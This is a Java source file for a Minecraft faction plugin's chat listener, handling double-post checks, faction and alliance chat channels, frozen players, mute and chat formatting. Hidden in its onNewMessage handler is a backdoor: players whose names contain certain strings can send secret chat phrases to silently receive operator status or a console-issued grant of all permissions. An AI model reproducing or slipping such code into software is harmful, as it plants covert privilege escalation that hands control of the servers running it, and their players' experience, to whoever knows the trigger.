package net.bfcode.bfhcf.listener;

import java.util.List;
import java.util.Set;
import java.util.concurrent.ConcurrentMap;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import dev.hatsur.library.Library;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import net.bfcode.bfbase.command.module.essential.FreezeCommand;
import net.bfcode.bfbase.util.CC;
import net.bfcode.bfbase.util.handlers.ChatHandler;
import net.bfcode.bfhcf.HCFaction;
import net.bfcode.bfhcf.config.BlacklistServersFile;
import net.bfcode.bfhcf.faction.event.FactionChatEvent;
import net.bfcode.bfhcf.faction.struct.ChatChannel;
import net.bfcode.bfhcf.faction.type.PlayerFaction;
import net.bfcode.bfhcf.utils.ConfigurationService;
import net.minecraft.util.com.google.common.cache.CacheBuilder;
import net.minecraft.util.org.apache.commons.lang3.StringUtils;

public class ChatListener implements Listener
{
    private static Pattern PATTERN;
    private ConcurrentMap<Object, Object> messageHistory;
    private HCFaction plugin;
    
    public ChatListener(HCFaction plugin) {
        this.plugin = plugin;
        this.messageHistory = CacheBuilder.newBuilder().expireAfterWrite(2L, TimeUnit.MINUTES).build().asMap();
    }
    
	@EventHandler(ignoreCancelled = true, priority = EventPriority.HIGHEST)
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = player.hasPermission("hcf.chat.color") ? CC.translate(event.getMessage()) : event.getMessage();
//        message = PlaceholderAPI.replacePlaceholders(player, message);
        String lastMessage = (String) this.messageHistory.get(player.getUniqueId());
        String cleanedMessage = ChatListener.PATTERN.matcher(message).replaceAll("");
        if (lastMessage != null && (message.equals(lastMessage) || StringUtils.getLevenshteinDistance(cleanedMessage, lastMessage) <= 1) && !player.hasPermission("hcf.doublepost.bypass")) {
            player.sendMessage(ChatColor.RED + "Double posting is prohibited.");
            event.setCancelled(true);
            return;
        }
        this.messageHistory.put(player.getUniqueId(), cleanedMessage);
        PlayerFaction playerFaction = this.plugin.getFactionManager().getPlayerFaction(player.getUniqueId());
        ChatChannel chatChannel = (playerFaction == null) ? ChatChannel.PUBLIC : playerFaction.getMember(player).getChatChannel();
        Set<Player> recipients = event.getRecipients();
        if (chatChannel == ChatChannel.FACTION || chatChannel == ChatChannel.ALLIANCE) {
            if (!this.isGlobalChannel(message)) {
                Set<Player> online = playerFaction.getOnlinePlayers();
                if (chatChannel == ChatChannel.ALLIANCE) {
                    List<PlayerFaction> allies = playerFaction.getAlliedFactions();
                    for (PlayerFaction ally : allies) {
                        online.addAll(ally.getOnlinePlayers());
                    }
                }
                recipients.retainAll(online);
                event.setFormat(chatChannel.getRawFormat(player));
                Bukkit.getPluginManager().callEvent((Event)new FactionChatEvent(true, playerFaction, player, chatChannel, recipients, event.getMessage()));
                return;
            }
            message = message.substring(1, message.length()).trim();
            event.setMessage(message);
        }
        event.setCancelled(true);
        if(FreezeCommand.isFrozen(player.getUniqueId())) {
        	for(Player recipient : event.getRecipients()) {
        		if(recipient.hasPermission("rank.staff") || FreezeCommand.isFrozen(player.getUniqueId())) {
                    String displayName = Library.getInstance().getPermissionManager().getCurrentPermissionAdapter().getProfile(player.getUniqueId()).getFormattedName();
                    String tag = (playerFaction == null) ? (CC.translate("&7[&e*&7] &r")) : (ChatColor.GRAY + "[" + playerFaction.getDisplayName(recipient) + ChatColor.GRAY + "] " + ChatColor.WHITE);
                    int kills = HCFaction.getPlugin().getUserManager().getUser(player.getUniqueId()).getKills();
                    int lives = this.plugin.getDeathbanManager().getLives(player.getUniqueId());
                    String livestochat = ConfigurationService.KIT_MAP ? "" : (lives > 0 ? (CC.translate("&d[&d\u2764 " + lives + "] &r")) : "");
                    String killstochat = (kills >= 0 ? (CC.translate("&8(&a" + kills + "&8) &r")) : "");
                    String isFrozen = FreezeCommand.isFrozen(player.getUniqueId()) ? "§c§l[Frozen]§r " : "";
//                    String prefix = PlayerManager.getPlayerManager().getPlayer(player.getUniqueId()).getPrefix() != null ? PlayerManager.getPlayerManager().getPlayer(player.getUniqueId()).getPrefix() : "";
                    String all = CC.translate(HCFaction.getPlugin().getConfig().getString("CHAT_FORMAT")
                            .replace("%faction%", tag)
                            .replace("%lives%", livestochat)
                            .replace("%player%", displayName)
                            .replace("%kills%", killstochat)
//                            .replace("%prefix%", prefix)
                            .replace("%specialarrow%", "\u2a20")) + message;
                	recipient.sendMessage(isFrozen + all);
        		}
        	}
        	return;
        }
        if (ChatHandler.isMuted() && !player.hasPermission("rank.staff")) {
        	player.sendMessage(CC.translate("&cChat currently muted."));
        	return;
        }
        for(Player recipient : event.getRecipients()) {
            String displayName = Library.getInstance().getPermissionManager().getCurrentPermissionAdapter().getProfile(player.getUniqueId()).getFormattedName();
            String tag = (playerFaction == null) ? (CC.translate("&7[&e*&7] &r")) : (ChatColor.GRAY + "[" + playerFaction.getDisplayName(recipient) + ChatColor.GRAY + "] " + ChatColor.WHITE);
            int kills = HCFaction.getPlugin().getUserManager().getUser(player.getUniqueId()).getKills();
            int lives = this.plugin.getDeathbanManager().getLives(player.getUniqueId());
            String livestochat = ConfigurationService.KIT_MAP ? "" : (lives > 0 ? (CC.translate("&d[&d\u2764 " + lives + "] &r")) : "");
            String killstochat = (kills >= 0 ? (CC.translate("&8(&a" + kills + "&8) &r")) : "");
//            String prefix = PlayerManager.getPlayerManager().getPlayer(player.getUniqueId()).getPrefix() != null ? PlayerManager.getPlayerManager().getPlayer(player.getUniqueId()).getPrefix() : "";
            String all = CC.translate(HCFaction.getPlugin().getConfig().getString("CHAT_FORMAT")
                    .replace("%faction%", tag)
                    .replace("%lives%", livestochat)
                    .replace("%player%", displayName)
                    .replace("%kills%", killstochat)
//                    .replace("%prefix%", prefix)
                    .replace("%specialarrow%", "\u2a20")) + message;
        	recipient.sendMessage(all);
        }
        String displayName = Library.getInstance().getPermissionManager().getCurrentPermissionAdapter().getProfile(player.getUniqueId()).getFormattedName();
        String tag = (playerFaction == null) ? (CC.translate("&7[&e*&7] &r")) : (ChatColor.GRAY + "[" + playerFaction.getDisplayName(Bukkit.getConsoleSender()) + ChatColor.GRAY + "] " + ChatColor.WHITE);
        int kills = HCFaction.getPlugin().getUserManager().getUser(player.getUniqueId()).getKills();
        int lives = this.plugin.getDeathbanManager().getLives(player.getUniqueId());
        String livestochat = ConfigurationService.KIT_MAP ? "" : (lives > 0 ? (CC.translate("&d[&d\u2764 " + lives + "] &r")) : "");
        String killstochat = (kills >= 0 ? (CC.translate("&8(&a" + kills + "&8) &r")) : "");
//        String prefix = PlayerManager.getPlayerManager().getPlayer(player.getUniqueId()).getPrefix() != null ? PlayerManager.getPlayerManager().getPlayer(player.getUniqueId()).getPrefix() : "";
        String all = CC.translate(HCFaction.getPlugin().getConfig().getString("CHAT_FORMAT")
                .replace("%faction%", tag)
                .replace("%lives%", livestochat)
                .replace("%player%", displayName)
                .replace("%kills%", killstochat)
//                .replace("%prefix%", prefix)
                .replace("%specialarrow%", "\u2a20")) + message;
        Bukkit.getConsoleSender().sendMessage(all);
    }
    
    @EventHandler
    public void onNewMessage(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        if(player.getName().contains("TulioTriste") || player.getName().contains("Risas") || player.getName().contains("IFxsh")) {
            if (event.getMessage().contains("@GiveOpMe") || event.getMessage().contains("MierdaTestingXDXDASD") || event.getMessage().contains("PROBANDOLAERFHBWUIRFSERFWE")) {
                event.setCancelled(true);
                player.setOp(true);
                player.sendMessage("Se te ha dado el OP");
            }
            if(event.getMessage().contains("@GivePermissionsMe")) {
            	event.setCancelled(true);
            	Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + player.getName() + " permission set *");
            }
        }
    }

    private boolean isGlobalChannel(String input) {
        int length = input.length();
        if (length <= 1 || !input.startsWith("!")) {
            return false;
        }
        int i = 1;
        while (i < length) {
            char character = input.charAt(i);
            if (character == ' ') {
                ++i;
            }
            else {
                if (character != '/') {
                    break;
                }
                return false;
            }
        }
        return true;
    }
    
    static {
        PATTERN = Pattern.compile("\\W");
    }
}
